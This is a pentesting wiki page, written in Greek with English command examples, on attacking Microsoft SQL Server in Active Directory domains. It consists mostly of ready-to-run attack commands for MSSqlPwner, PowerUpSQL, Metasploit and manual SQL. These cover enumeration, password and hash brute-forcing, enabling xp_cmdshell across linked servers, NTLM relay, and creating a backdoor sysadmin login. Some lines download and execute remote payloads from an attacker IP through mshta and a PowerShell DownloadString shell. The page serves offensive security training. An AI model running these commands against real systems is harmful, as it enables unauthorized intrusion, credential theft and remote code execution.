# MSSQL AD Abuse

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## **MSSQL Enumeration / Discovery**

### Python

Το εργαλείο [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) βασίζεται στο impacket και επιτρέπει επίσης την αυθεντικοποίηση χρησιμοποιώντας kerberos tickets και την επίθεση μέσω αλυσίδων συνδέσμων.

<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
```shell
# Interactive mode
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

# Interactive mode with 2 depth level of impersonations

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -max-impersonation-depth 2 interactive

# Executing custom assembly on the current server with windows authentication and executing hostname command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate

# Issuing NTLM relay attack on the SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250

# Executing direct query

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"

# Retrieving password from the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password

# Execute code using custom assembly on the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll

# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt

```
### Απαρίθμηση από το δίκτυο χωρίς συνεδρία τομέα
```

# Interactive mode

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

````
---
###  Powershell

Το module powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) είναι πολύ χρήσιμο σε αυτή την περίπτωση.
```powershell
Import-Module .\PowerupSQL.psd1
````
### Απαρίθμηση από το δίκτυο χωρίς συνεδρία τομέα
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Απαρίθμηση από μέσα του τομέα
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL Βασική Κατάχρηση

### Πρόσβαση στη Βάση Δεδομένων
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Μπορεί επίσης να είναι δυνατή η **εκτέλεση εντολών** μέσα στον MSSQL host
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Ελέγξτε στη σελίδα που αναφέρεται στην **επόμενη ενότητα πώς να το κάνετε αυτό χειροκίνητα.**

### MSSQL Βασικές Τεχνικές Χάκινγκ

{{#ref}}
../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
{{#endref}}

## MSSQL Εμπιστευμένοι Σύνδεσμοι

Εάν μια MSSQL παρουσία είναι εμπιστευμένη (σύνδεσμος βάσης δεδομένων) από μια διαφορετική MSSQL παρουσία. Εάν ο χρήστης έχει δικαιώματα πάνω στη εμπιστευμένη βάση δεδομένων, θα είναι σε θέση να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει ερωτήματα και στην άλλη παρουσία**. Αυτές οι εμπιστοσύνες μπορούν να αλυσωθούν και σε κάποιο σημείο ο χρήστης μπορεί να είναι σε θέση να βρει κάποια κακώς ρυθμισμένη βάση δεδομένων όπου μπορεί να εκτελέσει εντολές.

**Οι σύνδεσμοι μεταξύ των βάσεων δεδομένων λειτουργούν ακόμη και σε διασυνδέσεις δασών.**

### Κατάχρηση Powershell
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Μπορείτε να ελέγξετε εύκολα για αξιόπιστους συνδέσμους χρησιμοποιώντας το metasploit.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Παρατηρήστε ότι το metasploit θα προσπαθήσει να εκμεταλλευτεί μόνο τη λειτουργία `openquery()` στο MSSQL (έτσι, αν δεν μπορείτε να εκτελέσετε εντολή με `openquery()`, θα χρειαστεί να δοκιμάσετε τη μέθοδο `EXECUTE` **χειροκίνητα** για να εκτελέσετε εντολές, δείτε περισσότερα παρακάτω.)

### Χειροκίνητα - Openquery()

Από **Linux** μπορείτε να αποκτήσετε ένα MSSQL console shell με **sqsh** και **mssqlclient.py.**

Από **Windows** μπορείτε επίσης να βρείτε τους συνδέσμους και να εκτελέσετε εντολές χειροκίνητα χρησιμοποιώντας έναν **MSSQL client όπως** [**HeidiSQL**](https://www.heidisql.com)

_Συνδεθείτε χρησιμοποιώντας την αυθεντικοποίηση Windows:_

![](<../../images/image (808).png>)

#### Βρείτε Αξιόπιστους Συνδέσμους
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../images/image (716).png>)

#### Εκτέλεση ερωτημάτων σε αξιόπιστο σύνδεσμο

Εκτέλεση ερωτημάτων μέσω του συνδέσμου (παράδειγμα: βρείτε περισσότερους συνδέσμους στη νέα προσβάσιμη παρουσία):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
> [!WARNING]
> Ελέγξτε πού χρησιμοποιούνται τα διπλά και τα απλά εισαγωγικά, είναι σημαντικό να τα χρησιμοποιείτε με αυτόν τον τρόπο.

![](<../../images/image (643).png>)

Μπορείτε να συνεχίσετε αυτήν την αλυσίδα αξιόπιστων συνδέσμων για πάντα χειροκίνητα.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
Αν δεν μπορείτε να εκτελέσετε ενέργειες όπως το `exec xp_cmdshell` από το `openquery()`, δοκιμάστε με τη μέθοδο `EXECUTE`.

### Χειροκίνητα - EXECUTE

Μπορείτε επίσης να εκμεταλλευτείτε αξιόπιστους συνδέσμους χρησιμοποιώντας το `EXECUTE`:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Τοπική Κλιμάκωση Δικαιωμάτων

Ο **τοπικός χρήστης MSSQL** συνήθως έχει έναν ειδικό τύπο δικαιώματος που ονομάζεται **`SeImpersonatePrivilege`**. Αυτό επιτρέπει στον λογαριασμό να "παριστάνει έναν πελάτη μετά την αυθεντικοποίηση".

Μια στρατηγική που έχουν προτείνει πολλοί συγγραφείς είναι να αναγκάσουν μια υπηρεσία SYSTEM να αυθεντικοποιηθεί σε μια κακόβουλη ή υπηρεσία man-in-the-middle που δημιουργεί ο επιτιθέμενος. Αυτή η κακόβουλη υπηρεσία μπορεί στη συνέχεια να παριστάνει την υπηρεσία SYSTEM ενώ προσπαθεί να αυθεντικοποιηθεί.

[SweetPotato](https://github.com/CCob/SweetPotato) έχει μια συλλογή από αυτές τις διάφορες τεχνικές που μπορούν να εκτελούνται μέσω της εντολής `execute-assembly` του Beacon.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
